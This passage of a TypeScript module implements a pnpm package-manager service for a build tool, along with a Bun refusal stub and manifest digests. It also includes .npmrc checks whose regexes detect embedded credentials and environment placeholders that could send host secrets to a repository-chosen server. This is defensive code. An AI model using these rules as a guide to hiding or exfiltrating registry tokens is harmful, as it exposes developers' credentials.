 * asked for.
 *
 * @private
 */
const verified = (
  name: Name,
  requirement: string,
  version: Effect.Effect<string, PackageManagerError>
): Effect.Effect<string, PackageManagerError> =>
  Effect.flatMap(version, (measured) => {
    const outcome = Runtime.satisfies(requirement, measured)
    if (outcome === "unsupported_requirement") {
      return Effect.fail(
        new PackageManagerError({
          code: "environment_mismatch",
          message: `the declared ${name} version ${
            JSON.stringify(requirement)
          } is not an exact version or a single comparator, and ${
            JSON.stringify(measured)
          } cannot be checked against it`
        })
      )
    }
    return outcome
      ? Effect.succeed(measured)
      : Effect.fail(
        new PackageManagerError({
          code: "environment_mismatch",
          message: `this host runs ${name} ${measured}, and the workspace declares ${requirement}`
        })
      )
  })

/** Resolves the default Windows shim without ever invoking a command shell. */
const pnpmInvocation = (
  fs: FileSystem.FileSystem,
  options: NormalizedOptions,
  runtimeExecutable: string
): Effect.Effect<{ readonly executable: string; readonly prefix: ReadonlyArray<string> }, PackageManagerError> =>
  Effect.gen(function*() {
    if ((options.executable !== undefined && options.executable !== "pnpm") || options.platform.os !== "win32") {
      return { executable: options.executable ?? "pnpm", prefix: [] }
    }
    const mismatch = (shim: string) =>
      new PackageManagerError({
        code: "environment_mismatch",
        message: `cannot resolve ${shim} to one pnpm JavaScript entrypoint; provide a native executable override`
      })
    const path = absoluteSearchPath(Validate.sourceValue(options.environment, "PATH", true) ?? "", true)
    for (const component of path.split(";")) {
      // Relative entries were dropped above: resolved against the project
      // root they would select a repository-planted pnpm.cmd and entrypoint.
      const absolute = component.replace(/^"(.*)"$/, "$1")
      if (absolute === "") continue
      const shim = `${absolute}/pnpm.cmd`
      const present = yield* fs.exists(shim).pipe(Effect.mapError(() => mismatch(shim)))
      if (!present) continue
      // Honor the first shim on PATH. A different layout must be explicit,
      // rather than silently selecting a different pnpm later on PATH.
      // pnpm 11's self-update links PNPM_HOME/bin to a versioned store, and
      // its entrypoint is pnpm.mjs. Read the shim's literal target rather than
      // assuming the npm global layout or selecting a stale adjacent version.
      // These are paths only: no command text, arguments, or environment
      // expansions from the batch file are passed to a shell.
      const source = yield* fs.readFileString(shim).pipe(Effect.mapError(() => mismatch(shim)))
      const entries = new Set(
        [...source.matchAll(/"(?:%~dp0[\\/]|%dp0%[\\/]?)([^"\r\n]*pnpm\.(?:cjs|mjs))"[ \t]+%\*[ \t]*$/gim)]
          .map((match) => `${absolute}/${match[1]!.replaceAll("\\", "/")}`)
      )
      if (entries.size > 1) return yield* Effect.fail(mismatch(shim))
      const entry = entries.values().next().value ?? `${absolute}/node_modules/pnpm/bin/pnpm.cjs`
      const info = yield* fs.stat(entry).pipe(Effect.mapError(() => mismatch(shim)))
      if (info.type !== "File") return yield* Effect.fail(mismatch(shim))
      return { executable: runtimeExecutable, prefix: [entry] }
    }
    return yield* Effect.fail(mismatch("pnpm.cmd on PATH"))
  })

/**
 * Builds the pnpm implementation.
 *
 * pnpm is the manager the split was designed around: `pnpm fetch` reads the
 * lockfile, ignores the package manifest, and populates the store, and
 * `pnpm install --offline --frozen-lockfile` links out of it. The command is
 * still marked experimental by pnpm itself. That does not change the split.
 *
 * @category constructors
 * @since 0.1.0
 * @slop
 */
export const makePnpm = (options: Options): Effect.Effect<
  Service,
  never,
  ChildProcessSpawner | FileSystem.FileSystem | Runtime.Runtime
> =>
  Effect.gen(function*() {
    const runtime = yield* Runtime.Runtime
    const spawner = yield* ChildProcessSpawner
    const fs = yield* FileSystem.FileSystem
    const normalized = normalizeOptions(options, runtime.platform)
    const invocation = yield* Effect.cached(pnpmInvocation(fs, normalized, runtime.executable))
    const environment = yield* Effect.cached(managerEnvironment(fs, normalized))
    const projectRoot = normalized.projectRoot
    const timeoutMs = normalized.timeoutMs
    // A named host store is passed through as it stands; the default resolves
    // against the project root, so the store the fetch boundary declares and
    // the store the child writes are the same tree.
    const storeDirectory = normalized.storeDirectory ?? `${storeRoot}/pnpm`
    const storeArgs = [
      "--store-dir",
      normalized.storeDirectory ?? `${projectRoot}/${storeDirectory}`
    ]
    const command = (args: ReadonlyArray<string>, output: "capture" | "inherit") =>
      Effect.gen(function*() {
        const { env } = yield* environment
        const { executable, prefix } = yield* invocation
        return managerCommand(executable, [...prefix, ...args], projectRoot, env, output)
      })
    const version = yield* Effect.cached(
      Effect.flatMap(command(["--version"], "capture"), (child) => capture(spawner, "pnpm --version", child, timeoutMs))
    )
    const verify = verified("pnpm", normalized.requirement, version)
    // pnpm also loads a `pnpmfile` or `globalPnpmfile` setting. Naming the
    // measured default file turns those off; with no default file, hooks are
    // off entirely.
    const hookArgs = pnpmfileOf(projectRoot).pipe(
      Effect.provideService(FileSystem.FileSystem, fs),
      Effect.map((name) =>
        name === null ? ["--ignore-pnpmfile"] : ["--pnpmfile", `${projectRoot}/${name}`, "--global-pnpmfile="]
      )
    )
    const execute = (label: string, args: ReadonlyArray<string>) =>
      Effect.gen(function*() {
        yield* verify
        const { transportArgs } = yield* environment
        const child = yield* command([...args, ...transportArgs, ...(yield* hookArgs), ...storeArgs], "inherit")
        yield* run(spawner, label, child, timeoutMs)
      })
    return Object.freeze(
      {
        name: "pnpm",
        projectRoot,
        storeDirectory,
        lockfileName: "pnpm-lock.yaml",
        platformSensitive: true,
        requirement: normalized.requirement,
        version,
        verify,
        fetch: execute(
          "pnpm fetch",
          ["fetch", "--frozen-lockfile", "--ignore-scripts", "--reporter=append-only"]
        ),
        link: execute(
          "pnpm install --offline",
          [
            "install",
            "--offline",
            "--frozen-lockfile",
            "--ignore-scripts",
            "--reporter=append-only"
          ]
        ),
        // pnpm records the state of the virtual store it linked from.
        linkManifest: digestFile(
          fs,
          "manifest_unreadable",
          projectRoot,
          `${projectRoot}/node_modules/.modules.yaml`,
          maximumLockfileBytes
        )
      } satisfies Service
    )
  })

/**
 * Provides the pnpm implementation.
 *
 * @category layers
 * @since 0.1.0
 * @slop
 */
export const layerPnpm = (
  options: Options
): Layer.Layer<
  PackageManager,
  never,
  ChildProcessSpawner | FileSystem.FileSystem | Runtime.Runtime
> => Layer.effect(PackageManager)(makePnpm(options))

/**
 * Why no install runs under the Bun package manager.
 *
 * Bun exposes neither a fetch-only command with a documented store result nor
 * an offline install command, so it cannot meet the fetch-then-link contract
 * pnpm meets. Every install entry point (the `Install` target, the planner,
 * `runInstall`, the install Flow payload, and workspace generation) refuses a
 * Bun manager with this text when it is configured, instead of accepting it
 * and failing when the manager is first called.
 *
 * @category constants
 * @since 1.0.0
 */
export const bunInstallUnsupportedMessage =
  "Install cannot use the Bun package manager: Bun has no fetch-only or offline install command, " +
  "so it cannot meet the fetch-then-link contract; declare pnpm, or install node_modules with Bun outside Smithers"

/**
 * The typed refusal every install entry point returns for a Bun manager.
 *
 * @category constructors
 * @since 1.0.0
 */
export const bunInstallUnsupported = (): PackageManagerError =>
  new PackageManagerError({ code: "unsupported", message: bunInstallUnsupportedMessage })

/**
 * Builds the explicit unsupported Bun implementation.
 *
 * Bun currently exposes neither a fetch-only command with a documented store
 * result nor an offline install command. Treating `install --dry-run` as a
 * successful hard-boundary fetch would publish a cache entry without proof
 * that its declared store contains everything link needs. Refusing the three
 * operations is safer than presenting that best-effort behavior as sealed.
 * The layer still exists because Bun remains a valid tool runner: a target
 * that runs tools under Bun composes it and never asks it to install. Every
 * install entry point refuses Bun earlier with
 * {@link bunInstallUnsupportedMessage}.
 *
 * @category constructors
 * @since 0.1.0
 * @slop
 */
export const makeBun = (options: Options): Effect.Effect<
  Service,
  never,
  Runtime.Runtime
> =>
  Effect.gen(function*() {
    const runtime = yield* Runtime.Runtime
    return makeNoop("bun", options, runtime.platform)
  })

/**
 * Provides the Bun implementation.
 *
 * @category layers
 * @since 0.1.0
 * @slop
 */
export const layerBun = (
  options: Options
): Layer.Layer<PackageManager, never, Runtime.Runtime> => Layer.effect(PackageManager)(makeBun(options))

/** The lockfile each supported manager writes. */
const lockfileNames: Readonly<Record<Name, string>> = {
  pnpm: "pnpm-lock.yaml",
  bun: "bun.lock"
}

/**
 * Builds a manager that refuses every operation.
 *
 * This is what an unconfigured composition gets, and what a browser bundle
 * gets: the seam still resolves, and each call answers with a typed
 * `unsupported` failure naming the manager instead of vanishing. It is also
 * the explicit stand-in for Bun until a Bun implementation lands.
 *
 * @category constructors
 * @since 0.1.0
 * @slop
 */
export const makeNoop = (name: Name, options: Options, hostPlatform: Platform): Service => {
  if (name !== "pnpm" && name !== "bun") {
    throw new TypeError("package-manager name is unsupported")
  }
  const normalized = normalizeOptions(options, hostPlatform)
  const refuse = <A>(operation: string): Effect.Effect<A, PackageManagerError> =>
    Effect.fail(
      new PackageManagerError({
        code: "unsupported",
        message: `no ${name} implementation is wired for ${operation}`
      })
    )
  return Object.freeze({
    name,
    projectRoot: normalized.projectRoot,
    storeDirectory: normalized.storeDirectory ?? `${storeRoot}/${name}`,
    lockfileName: lockfileNames[name],
    platformSensitive: true,
    requirement: normalized.requirement,
    version: refuse<string>("version"),
    verify: refuse<string>("verify"),
    fetch: refuse<void>("fetch"),
    link: refuse<void>("link"),
    linkManifest: refuse<Digest>("linkManifest")
  })
}

/**
 * Provides a manager that refuses every operation.
 *
 * @category layers
 * @since 0.1.0
 * @slop
 */
export const layerNoop = (
  name: Name,
  options: Options,
  hostPlatform: Platform
): Layer.Layer<PackageManager> => Layer.succeed(PackageManager)(makeNoop(name, options, hostPlatform))

interface NormalizedStoreManifestInput {
  readonly manager: Name
  readonly managerVersion: string
  readonly platform: Platform | null
  readonly lockfileDigest: string
  readonly npmrcDigest: string | null
  readonly pnpmfileDigest: string | null
  readonly workspaceDigest: string | null
}

const digestPattern = /^[0-9a-f]{64}$/

const normalizeStoreManifestInput = (value: {
  readonly manager: Name
  readonly managerVersion: string
  readonly platform: Platform | null
  readonly lockfileDigest: string
  readonly npmrcDigest: string | null
  readonly pnpmfileDigest?: string | null
  readonly workspaceDigest?: string | null
}): NormalizedStoreManifestInput => {
  const record = Validate.plainRecord(value, "store manifest input")
  Validate.exactKeys(
    record,
    new Set([
      "manager",
      "managerVersion",
      "platform",
      "lockfileDigest",
      "npmrcDigest",
      "pnpmfileDigest",
      "workspaceDigest"
    ]),
    "store manifest input"
  )
  const manager = Validate.ownData(record, "manager", "store manifest input")
  if (manager !== "pnpm" && manager !== "bun") {
    throw new TypeError("store manifest manager is unsupported")
  }
  const managerVersion = Validate.ownData(record, "managerVersion", "store manifest input")
  if (
    typeof managerVersion !== "string" ||
    managerVersion.length === 0 ||
    !Validate.isWellFormedText(managerVersion) ||
    Buffer.byteLength(managerVersion, "utf8") > maximumVersionOutputBytes ||
    /[\u0000-\u001f\u007f]/.test(managerVersion)
  ) {
    throw new TypeError("store manifest managerVersion must be bounded single-line usable text")
  }
  const lockfileDigest = Validate.ownData(record, "lockfileDigest", "store manifest input")
  const npmrcDigest = Validate.ownData(record, "npmrcDigest", "store manifest input")
  if (typeof lockfileDigest !== "string" || !digestPattern.test(lockfileDigest)) {
    throw new TypeError("store manifest lockfileDigest must be a lowercase SHA-256 digest")
  }
  if (npmrcDigest !== null && (typeof npmrcDigest !== "string" || !digestPattern.test(npmrcDigest))) {
    throw new TypeError("store manifest npmrcDigest must be a lowercase SHA-256 digest or null")
  }
  const optionalDigest = (key: "pnpmfileDigest" | "workspaceDigest"): string | null => {
    if (!Object.hasOwn(record, key)) return null
    const digest = Validate.ownData(record, key, "store manifest input")
    if (digest !== null && (typeof digest !== "string" || !digestPattern.test(digest))) {
      throw new TypeError(`store manifest ${key} must be a lowercase SHA-256 digest or null`)
    }
    return digest
  }
  const platformValue = Validate.ownData(record, "platform", "store manifest input")
  return Object.freeze({
    manager,
    managerVersion,
    platform: platformValue === null ? null : normalizePlatform(platformValue, "store manifest platform"),
    lockfileDigest,
    npmrcDigest,
    pnpmfileDigest: optionalDigest("pnpmfileDigest"),
    workspaceDigest: optionalDigest("workspaceDigest")
  })
}

const renderStoreManifestText = (input: NormalizedStoreManifestInput): string =>
  JSON.stringify([
    input.pnpmfileDigest === null && input.workspaceDigest === null
      ? "smithers-build/store-manifest/v1"
      : "smithers-build/store-manifest/v2",
    input.manager,
    input.managerVersion,
    input.platform === null
      ? null
      : [input.platform.os, input.platform.arch, input.platform.libc],
    input.lockfileDigest,
    input.npmrcDigest,
    ...(input.pnpmfileDigest === null && input.workspaceDigest === null
      ? []
      : [input.pnpmfileDigest, input.workspaceDigest])
  ])

/**
 * The canonical text a store manifest digest is taken over.
 *
 * It is represented as a fixed JSON tuple, so field order is independent of
 * object construction order. The version prefix is hashed with everything
 * else, so a change to this shape cannot collide with a digest minted under
 * the old one.
 *
 * @category constructors
 * @since 0.1.0
 * @slop
 */
export const storeManifestText = (input: {
  readonly manager: Name
  readonly managerVersion: string
  readonly platform: Platform | null
  readonly lockfileDigest: string
  readonly npmrcDigest: string | null
  readonly pnpmfileDigest?: string | null
  readonly workspaceDigest?: string | null
}): string => renderStoreManifestText(normalizeStoreManifestInput(input))

/**
 * Computes the store manifest a fetch reports.
 *
 * @category constructors
 * @since 0.1.0
 * @slop
 */
export const storeManifest = (input: {
  readonly manager: Name
  readonly managerVersion: string
  readonly platform: Platform | null
  readonly lockfileDigest: string
  readonly npmrcDigest: string | null
  readonly pnpmfileDigest?: string | null
  readonly workspaceDigest?: string | null
}): Effect.Effect<StoreManifest, never, Crypto.Crypto> =>
  Effect.sync(() => normalizeStoreManifestInput(input)).pipe(
    Effect.flatMap((normalized) =>
      Effect.map(digestText(renderStoreManifestText(normalized)), (digest) =>
        Object.freeze({
          manager: normalized.manager,
          managerVersion: normalized.managerVersion,
          platform: normalized.platform,
          digest
        }))
    )
  )

/**
 * Reports a digest of store identity, the root package manifest, and manager metadata.
 *
 * This metadata is not an installed-tree freshness proof. It does not inspect
 * installed package bytes or establish their integrity; link always reconciles
 * the tree before reporting this digest.
 *
 * @category constructors
 * @since 0.1.0
 * @slop
 */
export const linkedTreeManifest = (input: {
  readonly storeDigest: Digest
  readonly packageJsonDigest: Digest
  readonly managerEvidence: Digest
}): Effect.Effect<Digest, never, Crypto.Crypto> =>
  Effect.sync(() => {
    const record = Validate.plainRecord(input, "linked tree manifest input")
    Validate.exactKeys(
      record,
      new Set(["storeDigest", "packageJsonDigest", "managerEvidence"]),
      "linked tree manifest input"
    )
    const values = [
      Validate.ownData(record, "storeDigest", "linked tree manifest input"),
      Validate.ownData(record, "packageJsonDigest", "linked tree manifest input"),
      Validate.ownData(record, "managerEvidence", "linked tree manifest input")
    ]
    if (!values.every((member) => typeof member === "string" && digestPattern.test(member))) {
      throw new TypeError("linked tree manifest inputs must be lowercase SHA-256 digests")
    }
    return JSON.stringify(["smithers-build/linked-tree-manifest/v1", ...values])
  }).pipe(Effect.flatMap(digestText))

/**
 * Parses live settings once for credential refusal and environment selection.
 *
 * This mirrors the `ini` decoder pnpm 10 reads `.npmrc` with, line for line.
 * Every check below reads these settings, so any divergence is a place a
 * setting can hide: a `\r` pnpm treats as a line break, or a quoted value pnpm
 * decodes with `JSON.parse` (`"\u0024{NAME}"` is `${NAME}` to pnpm). Settings
 * under an `[section]` header are kept; checking more than pnpm uses is safe.
 */
const parseNpmrc = (text: string): Array<readonly [name: string, value: string]> => {
  const settings: Array<readonly [name: string, value: string]> = []
  for (const line of text.split(/[\r\n]+/)) {
    if (line.length === 0 || /^\s*[;#]/.test(line)) continue
    const match = /^\[([^\]]*)\]$|^([^=]+)(=(.*))?$/.exec(line)
    if (match === null || match[2] === undefined) continue
    settings.push([iniValue(match[2]), match[3] === undefined ? "true" : iniValue(match[4] ?? "")])
  }
  return settings
}

/**
 * Decodes a key or value the way `ini`'s `unsafe` does: a quoted string goes
 * through `JSON.parse` (single quotes are stripped first), and an unquoted one
 * ends at the first unescaped `;` or `#`.
 */
const iniValue = (raw: string): string => {
  let value = raw.trim()
  const quoted = (value.startsWith("\"") && value.endsWith("\"")) || (value.startsWith("'") && value.endsWith("'"))
  if (quoted) {
    if (value.startsWith("'")) value = value.slice(1, -1)
    try {
      const parsed: unknown = JSON.parse(value)
      return typeof parsed === "string" ? parsed : JSON.stringify(parsed)
    } catch {
      return value
    }
  }
  let escaped = false
  let decoded = ""
  for (const character of value) {
    if (escaped) {
      decoded += "\\;#".includes(character) ? character : `\\${character}`
      escaped = false
    } else if (character === ";" || character === "#") {
      break
    } else if (character === "\\") {
      escaped = true
    } else {
      decoded += character
    }
  }
  if (escaped) decoded += "\\"
  return decoded.trim()
}

/**
 * Reports whether `.npmrc` embeds a credential instead of referring to an
 * environment variable.
 *
 * Install key material hashes the complete file. Literal credentials therefore
 * cannot be allowed in it. A value such as `${NPM_TOKEN}` is safe because the
 * file contains only the variable name, quoted or not. The environment value
 * remains a host capability and never enters the key or journal.
 *
 * Two shapes are refused: a credential-named setting whose value is not a bare
 * placeholder, and any value whose URL form carries userinfo, which is how a
 * password reaches `registry`, a scoped registry, `proxy`, and `https-proxy`
 * without ever being spelled under a credential-shaped name.
 *
 * @private
 */
const hasEmbeddedNpmCredential = (settings: ReadonlyArray<readonly [name: string, value: string]>): boolean => {
  const credential = /(?:^|:)(?:_auth|_authtoken|_password|token|key|keyfile|certfile|otp)$/i
  const environment = /^\$\{[A-Za-z_][A-Za-z0-9_]*\}$/
  // A URL carrying userinfo is a literal credential no matter what the setting
  // is called. `registry=`, a scoped registry, `proxy=`, and `https-proxy=` are
  // all spelled with an ordinary name the credential pattern never matches, so
  // without this the file passes the check and its password is digested into
  // install key material.
  const userinfoUrl = /^[A-Za-z][A-Za-z0-9+.-]*:\/\/[^/@\s]+@/
  return settings.some(([name, value]) => {
    if (userinfoUrl.test(value)) return true
    if (!credential.test(name)) return false
    return !environment.test(value)
  })
}

/**
 * Names the first setting whose value carries an environment placeholder
 * anywhere but as the whole value of a registry-scoped credential setting.
 *
 * pnpm expands `${NAME}` in every value. A placeholder in a registry URL, a
 * proxy, or an unscoped credential (which follows whatever `registry=` says)
 * would send the host variable to a server the repository chose. A
 * `//host/:_authToken=${NAME}` setting sends it only to the host its own key
 * names.
 *
 * @private
 */
const misplacedPlaceholder = (
  settings: ReadonlyArray<readonly [name: string, value: string]>
): string | undefined =>
  settings.find(([name, value]) =>
    // pnpm expands placeholders in setting names too.
    name.includes("${") ||
    value.includes("${") &&
      !(/^\/\/\S+:(?:_authToken|_auth|_password|username)$/i.test(name) &&
        /^\$\{[A-Za-z_][A-Za-z0-9_]*\}$/.test(value))
  )?.[0]

/** Refuses literal credentials and misplaced placeholders in a project `.npmrc`. */
const refuseUnsafeNpmrc = (
  path: string,
  settings: ReadonlyArray<readonly [name: string, value: string]>
): Effect.Effect<void, PackageManagerError> => {
  if (hasEmbeddedNpmCredential(settings)) {
    return Effect.fail(
      new PackageManagerError({
        code: "unsafe_configuration",
        message: `${path} embeds a credential; use an environment-variable placeholder`
      })
    )
  }
  const misplaced = misplacedPlaceholder(settings)
  return misplaced === undefined ? Effect.void : Effect.fail(
    new PackageManagerError({
      code: "unsafe_configuration",
      message: `${path} setting ${misplaced} uses an environment placeholder; placeholders are allowed only as ` +
        "the whole value of a registry-scoped _authToken, _auth, _password, or username setting"
    })
  )
}

/**
 * Digests the `.npmrc` that applies to a project, if there is one.
 *
 * The complete project-level file is digested. Literal credentials are
 * refused because the boundary also hashes this file. Use environment
 * placeholders for credentials. User-level and host-level configuration is
 * out of scope because a sealed step cannot key hidden files under `$HOME`.
 *
 * @category constructors
 * @since 0.1.0
 * @slop
 */
export const npmrcDigest = (
  projectRoot: string
): Effect.Effect<Digest | null, PackageManagerError, FileSystem.FileSystem | Crypto.Crypto> =>
  Effect.gen(function*() {
    const fs = yield* FileSystem.FileSystem
    const path = `${projectRoot}/.npmrc`
    const present = yield* fs.exists(path).pipe(
      Effect.mapError((cause) => unreadable("manifest_unreadable", path, cause))
    )
    if (!present) return null
    const text = yield* boundedText(fs, "manifest_unreadable", projectRoot, path, maximumNpmrcBytes)
    yield* refuseUnsafeNpmrc(path, parseNpmrc(text))
    return yield* digestText(text)
  })

/**
 * Digests a project's lockfile.
 *
 * @category constructors
 * @since 0.1.0
 * @slop
 */
export const lockfileDigest = (
  projectRoot: string,
  lockfileName: string
): Effect.Effect<Digest, PackageManagerError, FileSystem.FileSystem | Crypto.Crypto> =>
  Effect.gen(function*() {
    const fs = yield* FileSystem.FileSystem
    return yield* digestFile(
      fs,
      "lockfile_unreadable",
      projectRoot,
      `${projectRoot}/${lockfileName}`,
      maximumLockfileBytes
    )
  })

/**
 * Digests the root package manifest used by the link phase.
 *
 * @category constructors
 * @since 0.1.0
 * @slop
 */
export const packageJsonDigest = (
  projectRoot: string
): Effect.Effect<Digest, PackageManagerError, FileSystem.FileSystem | Crypto.Crypto> =>
  Effect.gen(function*() {
    const fs = yield* FileSystem.FileSystem
    return yield* digestFile(
      fs,
      "manifest_unreadable",
      projectRoot,
      `${projectRoot}/package.json`,
      maximumPackageJsonBytes
    )
  })
